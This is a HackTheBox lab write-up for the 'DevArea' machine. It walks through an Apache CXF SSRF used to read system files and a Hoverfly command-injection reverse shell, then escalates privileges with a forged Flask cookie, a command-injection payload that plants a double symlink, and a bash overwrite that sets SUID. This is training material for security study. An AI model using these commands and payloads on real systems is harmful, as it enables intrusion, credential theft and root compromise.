# DevArea — HackTheBox Writeup

**Difficulty:** Medium  
**OS:** Linux  
**Target IP:** `10.129.xx.xx`  
**Attacker VPN IP:** `10.10.xx.xx`

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [FTP Enumeration](#2-ftp-enumeration)
3. [Initial Foothold — CVE-2022-46364 (Apache CXF SSRF)](#3-initial-foothold--cve-2022-46364-apache-cxf-ssrf)
4. [Credential Discovery via SSRF](#4-credential-discovery-via-ssrf)
5. [RCE via Hoverfly — CVE-2025-54123](#5-rce-via-hoverfly--cve-2025-54123)
6. [User Flag](#6-user-flag)
7. [Privilege Escalation — Unintended Path (Patched)](#7-privilege-escalation--unintended-path-patched)
8. [Privilege Escalation — Intended Path (Double Symlink)](#8-privilege-escalation--intended-path-double-symlink)
9. [Root Flag](#9-root-flag)
10. [Step-by-Step Summary](#10-step-by-step-summary)

---

## 1. Reconnaissance

Start with a standard service/version scan:

```bash
nmap -sV -sC 10.129.xx.xx
```

**Results:**

| Port | Service | Details |
|------|---------|---------|
| 21/tcp | FTP (vsftpd 3.0.5) | Anonymous login allowed |
| 22/tcp | SSH (OpenSSH 9.6p1) | Ubuntu Linux |
| 80/tcp | HTTP (Apache 2.4.58) | Redirects to `http://devarea.htb/` |
| 8080/tcp | HTTP (Jetty 9.4.27) | 404 by default |
| 8500/tcp | HTTP (Golang) | Proxy server — ignores non-proxy requests |
| 8888/tcp | HTTP (Golang) | **Hoverfly Dashboard** |

Add the hostname to `/etc/hosts`:

```
10.129.xx.xx  devarea.htb
```

---

## 2. FTP Enumeration

Anonymous FTP access is permitted. A JAR file is found in the `pub` directory:

```bash
ftp 10.129.xx.xx
# Login as: anonymous (no password)
ftp> cd pub
ftp> get employee-service.jar
```

Unzip the JAR to inspect its contents:

```bash
unzip employee-service.jar
```

Notable classes extracted:
- `htb/devarea/ServerStarter.class`
- `htb/devarea/EmployeeService.class`

Check the embedded Maven metadata to identify the Apache CXF version:

```bash
cat META-INF/maven/org.apache.cxf/cxf-core/pom.properties
```

```
version=3.2.14
groupId=org.apache.cxf
artifactId=cxf-core
```

**Version 3.2.14** is significantly older than the patched releases (3.4.10 / 3.5.5), making it vulnerable to **CVE-2022-46364**.

---

## 3. Initial Foothold — CVE-2022-46364 (Apache CXF SSRF)

**CVE-2022-46364** is a Server-Side Request Forgery (SSRF) vulnerability in Apache CXF versions prior to 3.5.5 and 3.4.10. It exploits the parsing of the `href` attribute within `XOP:Include` elements in MTOM (Message Transmission Optimization Mechanism) SOAP requests.

An attacker can trick the server into fetching arbitrary URLs — including internal `file://` URIs — by embedding them in a crafted SOAP payload.

**PoC Reference:** `https://github.com/kasem545/CVE-2022-46364-Poc`

### Reading `/etc/passwd`

```bash
python3 lfi.py \
  -t http://devarea.htb:8080/employeeservice \
  -s file:///etc/passwd \
  -d devarea.htb
```

The server fetches the file, Base64-encodes it in the SOAP response, and the PoC decodes it automatically.

**Key accounts identified:**

```
root:x:0:0:root:/root:/bin/bash
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

---

## 4. Credential Discovery via SSRF

The Hoverfly dashboard is running on port 8888. To obtain its credentials, read the systemd service file:

```bash
python3 lfi.py \
  -t http://devarea.htb:8080/employeeservice \
  -s file:///etc/systemd/system/hoverfly.service \
  -d devarea.htb
```

**Decoded service file:**

```ini
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password <REDACTED> -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

Credentials obtained: `admin : <REDACTED>`

---

## 5. RCE via Hoverfly — CVE-2025-54123

**Hoverfly version:** v1.11.3

**CVE-2025-54123** is a command injection vulnerability in Hoverfly's middleware functionality, triggered via the `/api/v2/hoverfly/middleware` endpoint. Insufficient input validation allows arbitrary OS command execution.

> Although the advisory states versions "1.11.3 and prior," this specific deployment is still exploitable.

**PoC Reference:** `https://github.com/davidzzo23/CVE-2025-54123`

### Getting a Reverse Shell

Set up a listener (using `penelope`):

```bash
penelope -p 4444
```

Trigger the exploit:

```bash
python3 rce.py \
  -u admin \
  -p <REDACTED> \
  -r 10.10.xx.xx 4444 \
  -t "http://devarea.htb:8888"
```

The shell is caught, upgraded to a full PTY via Python, and lands as `dev_ryan` inside `/opt/HoverFly`.

### Stabilise with SSH

Since an SSH key is accessible, establish a stable session:

```bash
ssh -i id_rsa dev_ryan@10.129.xx.xx
```

---

## 6. User Flag

```bash
dev_ryan@devarea:~$ cat user.txt
<REDACTED>
```

---

## 7. Privilege Escalation — Unintended Path (Patched)

> **Note:** This path no longer works on the current instance. Documented for completeness.

The `/bin/bash` binary was world-writable (`-rwxrwxrwx`), allowing overwrite with a SUID-setting payload:

```bash
cp /usr/bin/bash /tmp/bash.bak

cat /tmp/payload.sh
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod +s /tmp/rootbash
cp /tmp/bash.bak /usr/bin/bash
exec /tmp/bash.bak "$@"

chmod +x /tmp/payload.sh
exec /bin/sh
dd if=/tmp/payload.sh of=/usr/bin/bash
sudo /opt/syswatch/syswatch.sh --version   # triggers payload execution
/tmp/rootbash -p                           # euid=0 (root)
```

This path has since been patched.

---

## 8. Privilege Escalation — Intended Path (Double Symlink)

### Enumeration

```bash
dev_ryan@devarea:~$ sudo -l
```

```
(root) NOPASSWD: /opt/syswatch/syswatch.sh
(root) NOPASSWD: !/opt/syswatch/syswatch.sh web-stop
(root) NOPASSWD: !/opt/syswatch/syswatch.sh web-restart
```

`dev_ryan` can run `syswatch.sh` as root (except the `web-stop` and `web-restart` subcommands).

### Source Review

Unzipping `syswatch-v1.zip` reveals a Flask-based web GUI (`syswatch_gui/app.py`) listening on port 7777, plus a `logs/` directory monitored by the script.

Reading `/etc/syswatch.env` via the earlier SSRF, or directly as `dev_ryan`:

```bash
cat /etc/syswatch.env
```

```
SYSWATCH_SECRET_KEY=<REDACTED>
SYSWATCH_ADMIN_PASSWORD=<REDACTED>
SYSWATCH_LOG_DIR=/opt/syswatch/logs
SYSWATCH_DB_PATH=/opt/syswatch/syswatch_gui/syswatch.db
SYSWATCH_PLUGIN_DIR=/opt/syswatch/plugins
SYSWATCH_BACKUP_DIR=/opt/syswatch/backup
SYSWATCH_VERSION=1.0.0
```

### Forging a Flask Session Cookie

Using the leaked `SYSWATCH_SECRET_KEY`, forge an admin session cookie:

```python
# forge.py
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

app = Flask(__name__)
app.secret_key = "<REDACTED>"

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
session_data = {"user_id": 1, "username": "admin"}
forged_cookie = session_serializer.dumps(session_data)
print(forged_cookie)
```

```bash
python3 forge.py
# Output: eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.<REDACTED>
```

### Exploiting the `/service-status` Endpoint (Command Injection)

The `/service-status` POST endpoint passes the `service` parameter unsanitized to a shell command. This allows creating symlinks as `dev_ryan` inside `/opt/syswatch/logs/`.

The `syswatch.sh logs <file>` command reads log files from `SYSWATCH_LOG_DIR`, but validates that the resolved path stays within that directory. A **double symlink chain** bypasses this check:

**Step 1 — Create `chain.log` pointing to `/root/root.txt`:**

```bash
curl -b "session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.<REDACTED>" \
  -X POST http://127.0.0.1:7777/service-status \
  -d "service=test | ln -s \$(printf '\057root\057root\056txt') \$(printf '\057opt\057syswatch\057logs\057chain\056log')"
```

This creates: `/opt/syswatch/logs/chain.log` → `/root/root.txt`

**Step 2 — Create `evil.log` pointing to `chain.log` (relative symlink):**

```bash
curl -b "session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.<REDACTED>" \
  -X POST http://127.0.0.1:7777/service-status \
  -d "service=test | ln -s \$(printf 'chain\056log') \$(printf '\057opt\057syswatch\057logs\057evil\056log')"
```

This creates: `/opt/syswatch/logs/evil.log` → `chain.log`

**Why does this bypass the check?**

The script likely resolves only one level of symlink for its path validation, seeing `evil.log` → `chain.log` (still inside `/opt/syswatch/logs/`). When actually read at runtime, the OS resolves the full chain: `evil.log` → `chain.log` → `/root/root.txt`.

**Step 3 — Read the file via `syswatch.sh` (runs as root):**

```bash
sudo /opt/syswatch/syswatch.sh logs evil.log
```

Output contains the root flag.

---

## 9. Root Flag

```
<REDACTED>
```

---

## 10. Step-by-Step Summary

### Phase 1 — Reconnaissance
- Nmap reveals 6 open ports: FTP (21), SSH (22), HTTP on Apache (80), Jetty (8080), a Go proxy (8500), and Hoverfly dashboard (8888).
- `devarea.htb` is added to `/etc/hosts`.

### Phase 2 — FTP & JAR Analysis
- Anonymous FTP access exposes `employee-service.jar` in `/pub`.
- Unzipping the JAR and inspecting Maven metadata reveals Apache CXF version **3.2.14**, which is vulnerable to CVE-2022-46364.

### Phase 3 — SSRF via CVE-2022-46364
- The `employee-service` is deployed on Jetty (port 8080) as a SOAP web service.
- A crafted MTOM request with `XOP:Include href="file:///etc/passwd"` causes the server to fetch and return internal files, Base64-encoded in the SOAP response.
- `/etc/passwd` is read to enumerate users (`dev_ryan`, `syswatch`).
- `/etc/systemd/system/hoverfly.service` reveals the Hoverfly admin credentials stored in plaintext in the `ExecStart` line.

### Phase 4 — RCE via CVE-2025-54123
- Hoverfly v1.11.3 is vulnerable to command injection in its middleware API endpoint.
- Using the obtained credentials, the PoC authenticates, injects a reverse shell payload, and obtains a shell as `dev_ryan`.
- A stable SSH session is established using `dev_ryan`'s SSH key.

### Phase 5 — User Flag
- `user.txt` is read from `/home/dev_ryan/`.

### Phase 6 — Privilege Escalation (Intended Path)
- `sudo -l` shows `dev_ryan` can run `/opt/syswatch/syswatch.sh` as root (with `web-stop` and `web-restart` explicitly blocked).
- The syswatch source code (via `syswatch-v1.zip`) and `/etc/syswatch.env` reveal a Flask web GUI on port 7777, a `SYSWATCH_SECRET_KEY`, and a `logs/` directory.
- The Flask session secret is used to forge a valid admin cookie.
- The `/service-status` endpoint is exploited via command injection to create two symlinks inside `/opt/syswatch/logs/`: `evil.log` → `chain.log` → `/root/root.txt`.
- A **double symlink** bypasses the path traversal check in `syswatch.sh`.
- Running `sudo /opt/syswatch/syswatch.sh logs evil.log` causes root to read and display `/root/root.txt`.

### Phase 7 — Root Flag
- The root flag is obtained without ever spawning a root shell.

---

## CVEs Referenced

| CVE | Component | Impact |
|-----|-----------|--------|
| CVE-2022-46364 | Apache CXF < 3.5.5 / 3.4.10 | SSRF via MTOM XOP:Include |
| CVE-2025-54123 | Hoverfly ≤ 1.11.3 | Command injection via middleware API |
